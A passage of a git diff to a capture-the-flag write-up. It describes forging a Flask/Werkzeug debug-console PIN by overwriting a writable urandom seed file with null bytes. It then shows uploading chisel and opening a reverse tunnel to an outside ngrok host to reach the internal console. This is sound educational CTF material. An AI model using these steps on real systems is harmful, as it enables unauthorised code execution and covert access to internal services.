@@ -827,17 +827,61 @@ Notice the private bits variable
     ]
 ```
 
-We know that to get the pin we need the private_bits and also the public bits which is easy to get:
+We know that to get the pin we need the private bits and also the public bits which is easy to get:
 
 ```python
 probably_public_bits = [
     'flaskdev',# username
     'flask.app',# modname
     'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
-    '/usr/local/lib/python3.8/dist-packages/flask/app.py' # getattr(mod, '__file__', None),
+    '/usr/local/lib/python3.10/dist-packages/flask/app.py' # getattr(mod, '__file__', None),
 ]
 ```
 
 Let us first get the other required private bit values
 ![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/c76596e7-93c9-4d1e-85ca-32ff53d988ca)
-![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/91b8e399-9071-49b4-a979-d94d8c22bcbc)
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/957aa047-5e62-461a-8c0b-d8ecffcf25e1)
+
+Now back to the private bit from the __init__.py file
+
+```python
+    private_bits = [
+        str(uuid.getnode()),
+        get_machine_id(),
+        open("/var/www/config/urandom", "rb").read(16) # ADDING EXTRA SECURITY TO PREVENT PIN FORGING
+    ]
+```
+
+We see that the developer included another value which reads in 16 bytes from the urandom binary located at */var/www/config/urandom*
+
+That is very impossible to guess but good thing is that we have full permission over that directory
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/732a0bda-551b-4045-9f79-4405f4d88d23)
+
+So the idea is that we can remove that binary then put null bytes into it, then when the script forms the new pin when cron runs it will then be predictable
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/91ed0762-ae8f-4ef8-ba2b-c2641bd1e4a0)
+
+Now that we have all this let us get the pin
+
+Here's the [script](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/heroctf/System/Flask2/genkey.py) I used
+
+Running it gives the key
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/8bcd1939-7571-4a5d-afed-24565749ae49)
+
+With this we can port forward the internal server on port 5000 to our host
+
+First I had to upload chisel to the box 
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/472dea4b-879b-40b5-a422-eed90ea001b0)
+
+Now we can port forward it 
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/5415734e-abc0-45f4-8849-8fd9a7d22854)
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/bbcdb832-c6ba-491b-b647-e57238e2b333)
+
+```
+Host: chisel server -p 80 --reverse
+Target: ./chisel client 7.tcp.eu.ngrok.io:11451 R:5000:127.0.0.1:5000 &
+```
+
+If we access it from our web server it and try going over /console we get the prompt
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/565cc71b-0f16-4527-8189-517fe43ee508)
+
+Using the key
